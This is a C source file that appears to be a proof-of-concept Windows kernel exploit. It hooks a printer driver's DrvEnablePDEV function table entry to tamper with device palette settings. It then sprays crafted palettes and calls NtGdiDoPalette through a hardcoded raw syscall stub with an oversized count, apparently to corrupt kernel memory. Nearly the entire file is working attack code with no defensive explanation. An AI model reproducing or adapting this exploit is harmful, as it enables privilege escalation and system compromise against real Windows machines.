#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
//#pragma comment( lib, "user32.lib")

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

typedef LONG_PTR(APIENTRY * PFN)();

typedef struct _DRVFN {
	ULONG iFunc;
	PFN   pfn;
} DRVFN, *PDRVFN;

typedef struct tagDRVENABLEDATA {
	ULONG iDriverVersion;
	ULONG c;
	DRVFN *pdrvfn;
} DRVENABLEDATA, *PDRVENABLEDATA;

typedef bool(__stdcall *P_DrvEnableDriver)(
	ULONG         iEngineVersion,
	ULONG         cj,
	DRVENABLEDATA *pded
);

typedef struct _DEVINFO {
	FLONG  flGraphicsCaps;
	LOGFONTW  lfDefaultFont;
	LOGFONTW  lfAnsiVarFont;
	LOGFONTW  lfAnsiFixFont;
	ULONG  cFonts;
	ULONG  iDitherFormat;
	USHORT  cxDither;
	USHORT  cyDither;
	HPALETTE  hpalDefault;
	FLONG  flGraphicsCaps2;
} DEVINFO, *PDEVINFO;

typedef LONG LDECI4;

typedef struct _CIECHROMA {
	LDECI4  x;
	LDECI4  y;
	LDECI4  Y;
} CIECHROMA;

typedef struct _COLORINFO {
	CIECHROMA  Red;
	CIECHROMA  Green;
	CIECHROMA  Blue;
	CIECHROMA  Cyan;
	CIECHROMA  Magenta;
	CIECHROMA  Yellow;
	CIECHROMA  AlignmentWhite;
	LDECI4  RedGamma;
	LDECI4  GreenGamma;
	LDECI4  BlueGamma;
	LDECI4  MagentaInCyanDye;
	LDECI4  YellowInCyanDye;
	LDECI4  CyanInMagentaDye;
	LDECI4  YellowInMagentaDye;
	LDECI4  CyanInYellowDye;
	LDECI4  MagentaInYellowDye;
} COLORINFO, *PCOLORINFO;

typedef struct _GDIINFO {
	ULONG  ulVersion;
	ULONG  ulTechnology;
	ULONG  ulHorzSize;
	ULONG  ulVertSize;
	ULONG  ulHorzRes;
	ULONG  ulVertRes;
	ULONG  cBitsPixel;
	ULONG  cPlanes;
	ULONG  ulNumColors;
	ULONG  flRaster;
	ULONG  ulLogPixelsX;
	ULONG  ulLogPixelsY;
	ULONG  flTextCaps;
	ULONG  ulDACRed;
	ULONG  ulDACGreen;
	ULONG  ulDACBlue;
	ULONG  ulAspectX;
	ULONG  ulAspectY;
	ULONG  ulAspectXY;
	LONG  xStyleStep;
	LONG  yStyleStep;
	LONG  denStyleStep;
	POINTL  ptlPhysOffset;
	SIZEL  szlPhysSize;
	ULONG  ulNumPalReg;
	COLORINFO  ciDevice;
	ULONG  ulDevicePelsDPI;
	ULONG  ulPrimaryOrder;
	ULONG  ulHTPatternSize;
	ULONG  ulHTOutputFormat;
	ULONG  flHTFlags;
	ULONG  ulVRefresh;
	ULONG  ulBltAlignment;
	ULONG  ulPanningHorzRes;
	ULONG  ulPanningVertRes;
	ULONG  xPanningAlignment;
	ULONG  yPanningAlignment;
	ULONG  cxHTPat;
	ULONG  cyHTPat;
	LPBYTE  pHTPatA;
	LPBYTE  pHTPatB;
	LPBYTE  pHTPatC;
	ULONG  flShadeBlend;
	ULONG  ulPhysicalPixelCharacteristics;
	ULONG  ulPhysicalPixelGamma;
} GDIINFO, *PGDIINFO;



typedef UINT(__stdcall *P_DrvEnablePDEV)(
	DEVMODEW *pdevmode,             /* Driver data */
	PWSTR     pwstrPrtName,         /* Printer's name in CreateDC() */
	ULONG     cPatterns,            /* Count of standard patterns */
	PVOID    *phsurfPatterns,       /* Buffer for standard patterns */
	ULONG     cjGdiInfo,            /* Size of buffer for GdiInfo */
	ULONG    *pulGdiInfo,           /* Buffer for GDIINFO */
	ULONG     cjDevInfo,            /* Number of bytes in devinfo */
	DEVINFO  *pdevinfo,             /* Device info */
	PVOID      hdev,               // HDEV, used for callbacks
	PWSTR     pwstrDeviceName,     /* Device Name - "LaserJet II" */
	HANDLE    hDriver              /* Printer handle for spooler access */
);





typedef DWORD(__stdcall *P_DrvDisableDriver)();



P_DrvDisableDriver DrvDisableDriver1 = NULL;
P_DrvEnablePDEV DrvEnablePDEV1 = NULL;

P_DrvEnableDriver DrvEnableDriver1 = NULL;


ULONG FN = 0;
DEVINFO *HK_pdevinfo = NULL;
GDIINFO *HK_pgdiinfo = NULL;


DWORD Hooks_Address = 0;

LOGPALETTE* Palette;
HPALETTE Where_PALETTE,What_PALETTE;
UCHAR Data[0x2000] = { 0 };


HWND hwnd, pwd;

__declspec(naked) ULONG NtGdiDoPalette(HPALETTE, UINT, UINT, PVOID, UINT, UINT){
	__asm {
			mov eax, 0x1082
			mov edx, 0x7ffe0300
			call dword ptr[edx]
			ret 0x14
	}
}


ULONG64 Create_Window(VOID){
	HINSTANCE hInstance;
	MSG msg;
	WNDCLASS wndclass = { 0 };

	char *Data;

	Data = (char *)malloc(0x1000);

	memset(Data, 'B', 0xFA0);

	hInstance = GetModuleHandleA(0);
	wndclass.style = CS_HREDRAW | CS_VREDRAW;
	wndclass.lpfnWndProc = DefWindowProc;
	wndclass.hInstance = hInstance;
	wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndclass.lpszClassName = TEXT("case");

	if (!RegisterClass(&wndclass)){
		printf("Register Window Class Error!\n");
		return 1;
	}

	hwnd = CreateWindowEx(0, wndclass.lpszClassName, TEXT("WORDS"), 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
}


__declspec(naked) ULONG Hooks(){

	HK_pdevinfo->flGraphicsCaps |= 0x00080000;
	HK_pgdiinfo->ulNumPalReg = 0;
	HK_pgdiinfo->ulNumColors = 0;
	HK_pdevinfo->hpalDefault = Where_PALETTE;
	__asm{
		jmp [FN]
	}

}


__declspec(naked) ULONG This_DrvEnablePDEV(
	DEVMODEW *pdevmode,             /* Driver data */
	PWSTR     pwstrPrtName,         /* Printer's name in CreateDC() */
	ULONG     cPatterns,            /* Count of standard patterns */
	PVOID    *phsurfPatterns,       /* Buffer for standard patterns */
	ULONG     cjGdiInfo,            /* Size of buffer for GdiInfo */
	ULONG    *pulGdiInfo,           /* Buffer for GDIINFO */
	ULONG     cjDevInfo,            /* Number of bytes in devinfo */
	DEVINFO  *pdevinfo,             /* Device info */
	PVOID      hdev,               // HDEV, used for callbacks
	PWSTR     pwstrDeviceName,     /* Device Name - "LaserJet II" */
	HANDLE    hDriver              /* Printer handle for spooler access */
	){
	__asm{
		mov eax, [esp]
		mov ebx, [Hooks_Address]
		mov [esp], ebx
		mov [FN], eax
		mov eax,[esp+0x20]
		mov [HK_pdevinfo], eax
		mov eax, [esp + 0x18]
		mov[HK_pgdiinfo], eax
		jmp DrvEnablePDEV1
	}
}






VOID GetEnumPrinters(){
	HDC Hdc1;


	ULONG DS_Size = 0; 
	DWORD Error = 0;
	HDC HADK = 0;
	LPDEVMODE pDevMode = NULL;
	DRVENABLEDATA DRV = { 0 };
	HMODULE Lib = NULL;
	HANDLE D = NULL;
	DWORD Size = 0x200, Data = 0,pcReturned = 0,Dr = NULL,Old = 0;
	LPWSTR Names[0x200] = { 0 };
	LPPRINTER_INFO_2 LS = NULL;

	LPDRIVER_INFO_2 DO = NULL;
	EnumPrinters(PRINTER_ENUM_FAVORITE | PRINTER_ENUM_LOCAL, (LPWSTR)&Names, 2, 0, 0, &Data, &pcReturned);

	LS = (LPPRINTER_INFO_2)malloc(Data + 4);

	EnumPrinters(PRINTER_ENUM_FAVORITE | PRINTER_ENUM_LOCAL, (LPWSTR)&Names, 2, (LPBYTE)LS, Data, &Data, &pcReturned);

	printf("Num:%p\n", pcReturned);

	for (UINT I = 0; I < 1; ++I){
		//Microsoft XPS Document Writer
		printf("pPrinterName:%ws\n", LS[I].pPrinterName);
		printf("pDriverName:%ws\n", LS[I].pDriverName);
		printf("pPortName:%ws\n", LS[I].pPortName);

		if (!OpenPrinter(LS[I].pPrinterName, &D, 0)){
			printf("Error!\n");
		}
		GetPrinterDriver(D, 0, 2, 0, 0, &Dr);

		DO = (LPDRIVER_INFO_2)malloc(Dr + 4);

		GetPrinterDriver(D, 0, 2, (LPBYTE)DO, Dr, &Dr);
		
		printf("pDriverPath:%ws\n", DO->pDriverPath);

		Lib = LoadLibraryExW(DO->pDriverPath,NULL, LOAD_WITH_ALTERED_SEARCH_PATH);

		DrvEnableDriver1 = (P_DrvEnableDriver)GetProcAddress(Lib, "DrvEnableDriver");

		DrvEnableDriver1(0x20000, 0x0c, &DRV);

		VirtualProtect(DRV.pdrvfn, 0x1000, PAGE_EXECUTE_READWRITE, &Old);
		
		//__asm int 3

		DrvEnablePDEV1 = (P_DrvEnablePDEV)*(ULONG*)((ULONG)DRV.pdrvfn + 0x04);

		*(ULONG*)((ULONG)DRV.pdrvfn + 0x04) = (ULONG)This_DrvEnablePDEV;


		DrvDisableDriver1 = (P_DrvDisableDriver)GetProcAddress(Lib, "DrvDisableDriver");


		DrvDisableDriver1();

		DS_Size = DocumentProperties(hwnd, D, LS[I].pPrinterName, 0, 0, 0);

		pDevMode = (LPDEVMODE)malloc(DS_Size + 0x200);

		DocumentProperties(hwnd, D, LS[I].pPrinterName, pDevMode, 0, DM_OUT_BUFFER);
	
		HADK = CreateDC(LS[I].pDriverName, LS[I].pPrinterName, LS[I].pPortName, LS[I].pDevMode);

		printf("DC:%p\n",HADK);

		SelectPalette(HADK, What_PALETTE, 0);

		RealizePalette(HADK);

		SaveDC(HADK);

		NtGdiDoPalette(What_PALETTE, 0x0, 0x300, &Data, 0, 0x500);


	}

}



int main(){

	HDC hdc,Hdc1;
	HWND hwnd;

	WORD *Assa = 0;

	Palette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE)+(sizeof(PALETTEENTRY)* (0x8000 - 0x01)));

	memset(Palette, 0x91, sizeof(LOGPALETTE)+(sizeof(PALETTEENTRY)* (0x8000)));

	memset(Palette+0x01, 0x90, sizeof(LOGPALETTE)+(sizeof(PALETTEENTRY)* (0x7000)));

	Palette->palVersion = 0x0300;
	Palette->palNumEntries = 0x100;

	Where_PALETTE = CreatePalette(Palette);

	Palette->palVersion = 0x0300;
	Palette->palNumEntries = 0x1000;

	What_PALETTE = CreatePalette(Palette);


	Hooks_Address = (ULONG)&Hooks;

	Create_Window();

	GetEnumPrinters();


	getchar();

}

